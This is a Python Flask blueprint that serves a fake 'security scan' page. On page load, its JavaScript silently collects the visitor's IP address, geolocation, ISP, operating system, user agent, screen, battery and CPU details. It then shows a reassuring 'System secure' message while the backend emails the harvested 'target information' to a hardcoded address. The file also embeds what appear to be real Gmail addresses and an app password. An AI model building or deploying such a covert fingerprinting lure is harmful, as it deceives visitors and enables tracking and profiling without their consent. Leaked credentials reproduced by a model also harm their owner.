from flask import Blueprint, render_template_string, request, jsonify
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

script20_bp = Blueprint('script20', __name__)

# --- CONFIGURATION (Apni Details Yahan Daal) ---
SENDER_EMAIL = "rehmandakit403@gmail.com"
SENDER_PASSWORD = "Rehmandakit#@#=66"  # Google App Password
RECEIVER_EMAIL = "hhhy97851@gmail.com"

PHANTOM_UI = """
<!DOCTYPE html>
<html>
<head>
    <title>SECURITY CHECK | OMEGA</title>
    <style>
        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding-top: 100px; }
        .terminal { border: 1px solid #00ff00; display: inline-block; padding: 40px; background: rgba(0,20,0,0.9); }
        .blink { animation: blinker 1s linear infinite; color: red; }
        @keyframes blinker { 50% { opacity: 0; } }
    </style>
</head>
<body onload="capture()">
    <div class="terminal">
        <h2>[!] CRITICAL SYSTEM SCAN [!]</h2>
        <p id="msg">Analyzing hardware vulnerabilities...</p>
        <div id="loader">_</div>
    </div>

    <script>
        async function capture() {
            // IP aur Location nikalna
            let ipInfo = {};
            try {
                const res = await fetch('https://ipapi.co/json/');
                ipInfo = await res.json();
            } catch(e) { ipInfo = {ip: "Unknown"}; }

            // Battery aur Device Info
            let battery = "N/A";
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                battery = (b.level * 100) + "%";
            }

            const data = {
                ip: ipInfo.ip,
                city: ipInfo.city,
                country: ipInfo.country_name,
                isp: ipInfo.org,
                os: navigator.platform,
                agent: navigator.userAgent,
                screen: window.screen.width + "x" + window.screen.height,
                battery: battery,
                cores: navigator.hardwareConcurrency || "N/A"
            };

            // Backend ko data bhejna
            fetch('/script20/capture_data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).then(() => {
                document.getElementById('msg').innerText = "System secure. No threats detected.";
                document.getElementById('loader').innerHTML = "[ OK ]";
            });
        }
    </script>
</body>
</html>
"""

@script20_bp.route('/')
def index():
    return render_template_string(PHANTOM_UI)

@script20_bp.route('/capture_data', methods=['POST'])
def capture_data():
    data = request.json
    
    # Mail Content Taiyar Karna
    subject = f"⚠️ NEW INTEL GATHERED: {data['ip']}"
    body = f"""
    SHIVAM SIR, A NEW DEVICE HAS ACCESSED THE LINK.
    
    [ TARGET INFORMATION ]
    ---------------------------------
    IP ADDRESS : {data['ip']}
    LOCATION   : {data['city']}, {data['country']}
    ISP        : {data['isp']}
    
    [ DEVICE SPECIFICATIONS ]
    ---------------------------------
    OPERATING SYSTEM : {data['os']}
    SCREEN RES      : {data['screen']}
    CPU CORES       : {data['cores']}
    BATTERY LEVEL   : {data['battery']}
    
    [ BROWSER FINGERPRINT ]
    ---------------------------------
    USER AGENT : {data['agent']}
    """

    try:
        # SMTP Setup
        msg = MIMEMultipart()
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECEIVER_EMAIL
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        server.send_message(msg)
        server.quit()
        return jsonify({"status": "Success"}), 200
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"status": "Failed"}), 500
